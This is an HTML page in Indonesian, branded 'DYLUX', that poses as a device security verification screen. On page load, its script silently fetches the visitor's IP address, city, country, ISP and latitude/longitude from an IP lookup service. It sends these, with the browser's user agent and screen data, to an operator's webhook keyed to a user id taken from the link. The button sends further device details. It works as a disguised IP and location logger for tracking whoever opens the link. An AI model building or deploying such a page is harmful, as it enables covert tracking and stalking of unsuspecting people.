<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Device Info</title>
    <script src="config.js"></script>
    <style>
        :root {
            --primary: #00f0ff;
            --secondary: #7b2ffc;
            --bg: #0a0a0f;
            --card: #14141e;
            --text: #e0e0ff;
            --text2: #8888aa;
            --border: rgba(0,240,255,0.1);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg);
            font-family: -apple-system, 'Inter', sans-serif;
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background-image: radial-gradient(ellipse at 10% 20%, rgba(0,240,255,0.03) 0%, transparent 50%);
        }
        .container {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 40px 32px;
            max-width: 400px;
            width: 100%;
        }
        .header { text-align: center; margin-bottom: 24px; }
        .logo {
            font-size: 24px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .badge {
            display: inline-block;
            background: rgba(123,47,252,0.1);
            color: var(--secondary);
            font-size: 11px;
            padding: 4px 12px;
            border-radius: 20px;
            margin-top: 6px;
            font-weight: 600;
        }
        .icon { font-size: 48px; text-align: center; margin: 12px 0; }
        .title {
            font-size: 18px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 6px;
        }
        .desc {
            font-size: 14px;
            color: var(--text2);
            text-align: center;
            line-height: 1.6;
        }
        .device-card {
            background: var(--bg);
            border-radius: 12px;
            padding: 16px;
            margin: 16px 0;
            border: 1px solid var(--border);
        }
        .device-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid var(--border);
            font-size: 13px;
        }
        .device-row:last-child { border-bottom: none; }
        .device-row .label { color: var(--text2); }
        .device-row .value { color: var(--text); font-weight: 500; }
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: #fff;
            transition: 0.3s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 0 30px rgba(0,240,255,0.2); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .footer {
            text-align: center;
            font-size: 11px;
            color: var(--text2);
            margin-top: 20px;
            padding-top: 16px;
            border-top: 1px solid var(--border);
        }
        .footer a { color: var(--primary); text-decoration: none; }
        .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid var(--border);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 12px auto 0;
        }
        .spinner.active { display: block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status-msg { text-align: center; font-size: 13px; color: var(--text2); margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">DYLUX</div>
            <div class="badge">💻 Device Info</div>
        </div>

        <div class="icon">💻</div>
        <div class="title">Informasi Perangkat</div>
        <div class="desc">
            Deteksi perangkat Anda untuk verifikasi keamanan.
        </div>

        <div class="device-card">
            <div class="device-row">
                <span class="label">📱 Perangkat</span>
                <span class="value" id="deviceName">-</span>
            </div>
            <div class="device-row">
                <span class="label">🌍 Browser</span>
                <span class="value" id="browserName">-</span>
            </div>
            <div class="device-row">
                <span class="label">🖥️ Resolusi</span>
                <span class="value" id="screenRes">-</span>
            </div>
            <div class="device-row">
                <span class="label">🌐 Bahasa</span>
                <span class="value" id="languageInfo">-</span>
            </div>
            <div class="device-row">
                <span class="label">⏰ Zona Waktu</span>
                <span class="value" id="timezoneInfo">-</span>
            </div>
        </div>

        <button class="btn" id="infoBtn">Verifikasi Perangkat</button>

        <div class="spinner" id="spinner"></div>
        <div class="status-msg" id="statusMsg"></div>

        <div class="footer">
            &copy; 2026 <a href="#">DYLUX</a> • Cahaya dalam Kegelapan
        </div>
    </div>

    <script>
        function getUserId() {
            const params = new URLSearchParams(window.location.search);
            return params.get('id');
        }

        async function autoDetect() {
            const userId = getUserId();
            if (!userId) return;
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                await fetch(DYLUX_CONFIG.WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        user_id: userId,
                        type: 'auto_detect',
                        data: {
                            ip: ipData.ip || 'unknown',
                            city: ipData.city || 'unknown',
                            region: ipData.region || 'unknown',
                            country: ipData.country_name || 'unknown',
                            isp: ipData.org || 'unknown',
                            lat: ipData.latitude || 0,
                            lon: ipData.longitude || 0,
                            device: {
                                userAgent: navigator.userAgent,
                                platform: navigator.platform,
                                language: navigator.language,
                                screen: `${window.screen.width}x${window.screen.height}`
                            },
                            timestamp: new Date().toISOString()
                        }
                    })
                });
                console.log('✅ Auto-detect sent');
            } catch (e) { console.error(e); }
        }

        // ============================================
        // DETECT DEVICE INFO
        // ============================================
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Unknown';
            if (/iPhone|iPad|iPod/.test(ua)) device = 'Apple iOS';
            else if (/Android/.test(ua)) device = 'Android';
            else if (/Windows/.test(ua)) device = 'Windows';
            else if (/Mac/.test(ua)) device = 'macOS';
            else if (/Linux/.test(ua)) device = 'Linux';
            
            let browser = 'Unknown';
            if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edg/.test(ua)) browser = 'Edge';
            else if (/Opera/.test(ua)) browser = 'Opera';

            return {
                device: device,
                browser: browser,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        const userId = getUserId();
        const infoBtn = document.getElementById('infoBtn');
        const spinner = document.getElementById('spinner');
        const statusMsg = document.getElementById('statusMsg');

        // Tampilkan device info
        const info = getDeviceInfo();
        document.getElementById('deviceName').textContent = info.device;
        document.getElementById('browserName').textContent = info.browser;
        document.getElementById('screenRes').textContent = info.screen;
        document.getElementById('languageInfo').textContent = info.language;
        document.getElementById('timezoneInfo').textContent = info.timezone;

        infoBtn.addEventListener('click', async () => {
            infoBtn.disabled = true;
            spinner.classList.add('active');
            statusMsg.style.display = 'none';

            await fetch(DYLUX_CONFIG.WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    user_id: userId,
                    type: 'device_info',
                    data: {
                        device: info.device,
                        browser: info.browser,
                        screen: info.screen,
                        language: info.language,
                        timezone: info.timezone,
                        userAgent: navigator.userAgent,
                        timestamp: new Date().toISOString()
                    }
                })
            });

            spinner.classList.remove('active');
            infoBtn.disabled = false;
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = '✅ Informasi perangkat terkirim!';
        });

        document.addEventListener('DOMContentLoaded', autoDetect);
    </script>
</body>
</html>
